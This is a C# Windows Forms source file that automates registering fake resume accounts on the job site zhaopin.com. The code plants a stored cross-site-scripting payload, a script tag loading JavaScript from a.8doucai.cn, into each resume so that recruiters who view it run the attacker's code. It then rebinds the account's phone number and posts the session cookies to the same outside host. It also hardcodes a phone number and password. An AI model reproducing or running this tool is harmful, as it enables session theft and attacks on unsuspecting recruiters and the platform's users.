using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Badoucai.Business.Model;
using Badoucai.Business.Zhaopin;
using Badoucai.Library;
using Newtonsoft.Json;
using System.Web;

namespace Badoucai.WindowsForm.Zhaopin
{
    public partial class CreateUserForm : Form
    {
        private static AutoRegisterBusiness resumeManagement;

        //private const string oldCellphone = "13028814991";
        //private const string oldCellphone = "18320762771";
        private const string oldCellphone = "18320745770";

        private const string password = "a5QPyk6S";

        public CreateUserForm()
        {
            InitializeComponent();

            resumeManagement = new AutoRegisterBusiness();
        }

        private void btn_PushRegisterSMS_Click(object sender, EventArgs e)
        {
            this.webBrowser.Navigate("https://passport.zhaopin.com/account/register");

            this.webBrowser.DocumentCompleted += WebBrowser_DocumentCompleted;

            //if (string.IsNullOrWhiteSpace(this.tbx_CheckCode.Text))
            //{
            //    var getResult = resumeManagement.GetRegisterCaptcha();

            //    if (!getResult.IsSuccess)
            //    {
            //        Program.SetLog(this.tbx_Log, getResult.ErrorMsg);

            //        return;
            //    }

            //    pic_CheckCode.Image = Image.FromStream(getResult.Data);

            //    Program.SetLog(this.tbx_Log, "请输入图片验证码！");

            //    return;
            //}

            //var sendResult = resumeManagement.SendRegisterSms(this.tbx_Cellphone.Text.Trim(), this.tbx_CheckCode.Text.Trim());

            //if (!sendResult.IsSuccess)
            //{
            //    Program.SetLog(this.tbx_Log, sendResult.ErrorMsg);

            //    return;
            //}

            //Program.SetLog(this.tbx_Log, "发送短信验证码成功！");
        }

        private void WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (this.webBrowser.Url.AbsoluteUri.Contains("https://passport.zhaopin.com"))
            {
                this.webBrowser.Document?.GetElementById("LoginName")?.SetAttribute("value", oldCellphone);

                this.webBrowser.Document?.GetElementById("Password")?.SetAttribute("value", password);

                this.webBrowser.Document?.GetElementById("RegisterName")?.SetAttribute("value", oldCellphone);

                this.webBrowser.Document?.GetElementById("Password")?.SetAttribute("value", password);

                this.webBrowser.Document?.GetElementById("PasswordConfirm")?.SetAttribute("value", password);

                this.webBrowser.Document?.GetElementById("accept")?.SetAttribute("checked", "checked");
            } 
        }

        private void btn_Register_Click(object sender, EventArgs e)
        {
            AutoRegisterBusiness.cookieContainer = webBrowser.Document?.Cookie.Serialize("zhaopin.com");

            var resumeJson = File.ReadAllText(Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory).Parent?.Parent?.FullName + "/App_Data/Zhaopin/ResumeTemplates/Resume_v1.json");

            var baseResumeModel = JsonConvert.DeserializeObject<BaseResumeModel>(resumeJson);

            var email = DateTime.Now.ToString("yyMMddHHmmss") + "@163.com";

            baseResumeModel.UserInformation.Email = email;

            Program.SetLog(this.tbx_Log, "加载简历模板成功！开始自动填充简历...");

            var addInfoResult = resumeManagement.AddUserInformation(baseResumeModel.UserInformation);

            if (!addInfoResult.IsSuccess)
            {
                Program.SetLog(this.tbx_Log, "插入用户信息失败!");

                return;
            }

            Program.SetLog(this.tbx_Log, "插入用户信息成功！");

            var addContentResult = resumeManagement.AddResumeBaseContent(baseResumeModel);

            if (!addContentResult.IsSuccess)
            {
                Program.SetLog(this.tbx_Log, "插入简历内容失败!");

                return;
            }

            Program.SetLog(this.tbx_Log, "插入简历内容成功！");

            var insertXssResult = resumeManagement.InsertXssJs(addContentResult.Data.Item1, addContentResult.Data.Item2, baseResumeModel, "<script type='text/javascript' src='https://a.8doucai.cn/scripts/default.js'></script>");

            if (!insertXssResult.IsSuccess)
            {
                Program.SetLog(this.tbx_Log, "植入脚本失败!");

                return;
            }

            Program.SetLog(this.tbx_Log, "植入脚本成功！");

            var addSelfEvalueteResult = resumeManagement.AddSelfEvaluete(addContentResult.Data.Item1, addContentResult.Data.Item2, "非双休勿扰！加班勿扰！无年底双薪勿扰！最近由于骚扰电话过多，如有邀请，请发邮件联系！");

            if (!addSelfEvalueteResult.IsSuccess)
            {
                Program.SetLog(this.tbx_Log, "添加自我介绍失败!");

                return;
            }

            Program.SetLog(this.tbx_Log, "添加自我介绍成功！");

            var setPrivateResult = resumeManagement.SetResumePrivate(addContentResult.Data.Item1, addContentResult.Data.Item2);

            if (!setPrivateResult.IsSuccess)
            {

                Program.SetLog(this.tbx_Log, "设置简历保密失败!");

                return;
            }

            Program.SetLog(this.tbx_Log, "设置简历保密成功！");

            Program.SetLog(this.tbx_Log, "填充简历完成，简历创建成功！邮箱：" + email);

            this.tbx_SMSCheckCode.ResetText();

            this.tbx_CheckCode.ResetText();
        }

        private void btn_PushBindSMS_Click(object sender, EventArgs e)
        {
            if( AutoRegisterBusiness.cookieContainer.Count< 20 ) AutoRegisterBusiness.cookieContainer = webBrowser.Document?.Cookie.Serialize("zhaopin.com");

            if (string.IsNullOrWhiteSpace(this.tbx_CheckCode.Text))
            {
                var getResult = resumeManagement.GetBindCaptcha();

                if (!getResult.IsSuccess)
                {
                    Program.SetLog(this.tbx_Log, getResult.ErrorMsg);

                    return;
                }

                pic_CheckCode.Image = Image.FromStream(getResult.Data);

                Program.SetLog(this.tbx_Log, "请输入图片验证码！");

                return;
            }

            var sendResult = resumeManagement.SendBindSms(this.tbx_Cellphone.Text.Trim(), this.tbx_CheckCode.Text.Trim());

            if (!sendResult.IsSuccess)
            {
                Program.SetLog(this.tbx_Log, sendResult.ErrorMsg);

                return;
            }

            Program.SetLog(this.tbx_Log, "发送短信验证码成功！");
        }

        private void btn_BindCellphone_Click(object sender, EventArgs e)
        {
            try
            {
                var changeResult = resumeManagement.ChangeMobile(this.tbx_SMSCheckCode.Text.Trim(), oldCellphone, this.tbx_Cellphone.Text.Trim());

                if (!changeResult.IsSuccess)
                {
                    Program.SetLog(this.tbx_Log, "换绑手机失败！" + changeResult.ErrorMsg);

                    return;
                }
            }
            catch (Exception ex)
            {
                this.webBrowser.DocumentText = ex.Message;
            }

            RequestFactory.QueryRequest("https://a.8doucai.cn/cookie/save", HttpUtility.UrlEncode(AutoRegisterBusiness.cookieContainer.GetCookieHeader(new Uri("https://i.zhaopin.com"))), RequestEnum.POST, referer: "https://i.zhaopin.com/");

            AutoRegisterBusiness.cookieContainer = new CookieContainer();

            if (this.webBrowser.Document != null) this.webBrowser.Document.Cookie = "";

            Program.SetLog(this.tbx_Log, "换绑手机成功！新手机：" + this.tbx_Cellphone.Text.Trim());
        }
    }
}
